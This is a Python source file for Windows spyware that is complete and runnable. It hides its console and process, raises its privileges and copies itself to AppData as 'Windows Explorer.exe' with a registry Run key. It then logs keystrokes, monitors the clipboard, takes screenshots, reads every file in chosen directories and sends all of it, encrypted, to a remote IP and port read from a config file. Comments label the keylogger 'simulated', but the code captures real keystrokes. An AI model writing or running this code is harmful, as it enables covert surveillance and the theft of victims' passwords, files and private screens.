import socket
import threading
import time
import os
import sys
import platform
import win32console
import win32gui
import win32process
import win32event
import win32api
import win32security
import ctypes
import subprocess
import json
import keyboard
import psutil
from PIL import ImageGrab
import base64
from cryptography.fernet import Fernet
import shutil
import win32clipboard

# Hide the console window
def hide_console():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)

# Hide the process from task manager
def hide_process():
    hwnd = win32gui.GetParent(win32gui.GetParent(win32gui.GetForegroundWindow()))
    win32gui.ShowWindow(hwnd, 0)
    win32gui.EnableWindow(hwnd, 0)

# Elevate privileges to hide the process better
def elevate_privileges():
    try:
        hToken = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)
        luid = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")
        win32security.AdjustTokenPrivileges(hToken, 0, [(luid, win32security.SE_PRIVILEGE_ENABLED)])
    except Exception as e:
        print(f"Error elevating privileges: {e}")

# Collect comprehensive system information
def collect_system_info():
    info = {
        "hostname": os.getenv('COMPUTERNAME'),
        "username": os.getenv('USERNAME'),
        "os": platform.system(),
        "platform": platform.platform(),
        "architecture": platform.architecture()[0],
        "processor": platform.processor(),
        "machine": platform.machine(),
        "release": platform.release(),
        "version": platform.version(),
        "networks": [iface for iface in psutil.net_if_addrs().keys()],
        "disks": [disk.device for disk in psutil.disk_partitions()]
    }
    return json.dumps(info)

# Simulate keylogging
class Keylogger:
    def __init__(self):
        self.log = ""
    
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = f"[{name.upper()}]"
        self.log += name
    
    def start(self):
        keyboard.on_release(callback=self.callback)
        return self.log

# Capture screenshot
def capture_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_path = os.path.join(os.getenv('TEMP'), 'screenshot.png')
    screenshot.save(screenshot_path)
    with open(screenshot_path, 'rb') as image_file:
        encoded_image = base64.b64encode(image_file.read()).decode()
    os.remove(screenshot_path)
    return encoded_image

# Monitor clipboard
def monitor_clipboard():
    clipboard_log = ""
    while True:
        try:
            current_clipboard = win32clipboard.GetClipboardData()
            if current_clipboard != clipboard_log:
                clipboard_log = current_clipboard
                yield clipboard_log
        except Exception as e:
            pass
        time.sleep(1)

# Steal files from target directories
def steal_files(target_directories):
    stolen_files = []
    for directory in target_directories:
        directory = os.path.expandvars(directory)
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'rb') as f:
                            file_data = f.read()
                            encoded_file = base64.b64encode(file_data).decode()
                            stolen_files.append({"path": file_path, "data": encoded_file})
                    except Exception as e:
                        pass
    return stolen_files

# Send data to the remote server
def send_data(public_ip, public_port, data, encryption_key):
    try:
        cipher_suite = Fernet(encryption_key)
        encrypted_data = cipher_suite.encrypt(data.encode())
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((public_ip, public_port))
        client_socket.sendall(encrypted_data)
        client_socket.close()
    except Exception as e:
        print(f"Error sending data: {e}")

# Make the script persistent
def make_persistent():
    file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
    if not os.path.exists(file_location):
        shutil.copyfile(sys.executable, file_location)
        subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v explorer /t REG_SZ /d "' + file_location + '"', shell=True)

# Load configuration
def load_config():
    with open('config.json', 'r') as config_file:
        config = json.load(config_file)
    return config

# Main function
def main():
    hide_console()
    hide_process()
    elevate_privileges()
    make_persistent()
    
    config = load_config()
    public_ip = config['public_ip']
    public_port = config['public_port']
    interval = config['interval']
    target_directories = config['target_directories']
    encryption_key = config['encryption_key'].encode()
    
    # Collect system information
    system_info = collect_system_info()
    send_data(public_ip, public_port, system_info, encryption_key)
    
    # Simulate keylogging
    keylogger = Keylogger()
    keylogger_thread = threading.Thread(target=keylogger.start)
    keylogger_thread.daemon = True
    keylogger_thread.start()
    
    # Monitor clipboard
    clipboard_monitor = monitor_clipboard()
    clipboard_thread = threading.Thread(target=lambda: send_clipboard_data(public_ip, public_port, clipboard_monitor, encryption_key))
    clipboard_thread.daemon = True
    clipboard_thread.start()
    
    # Steal files
    stolen_files = steal_files(target_directories)
    send_data(public_ip, public_port, json.dumps(stolen_files), encryption_key)
    
    # Capture screenshots
    screenshot_thread = threading.Thread(target=lambda: capture_and_send_screenshots(public_ip, public_port, encryption_key))
    screenshot_thread.daemon = True
    screenshot_thread.start()
    
    # Periodically send keylogged data to the server
    while True:
        time.sleep(interval)  # Adjust the interval as needed
        if keylogger.log:
            send_data(public_ip, public_port, keylogger.log, encryption_key)
            keylogger.log = ""

def send_clipboard_data(public_ip, public_port, clipboard_monitor, encryption_key):
    for clipboard_data in clipboard_monitor:
        send_data(public_ip, public_port, clipboard_data, encryption_key)

def capture_and_send_screenshots(public_ip, public_port, encryption_key):
    while True:
        screenshot = capture_screenshot()
        send_data(public_ip, public_port, screenshot, encryption_key)
        time.sleep(60)  # Capture screenshot every 60 seconds

if __name__ == "__main__":
    main()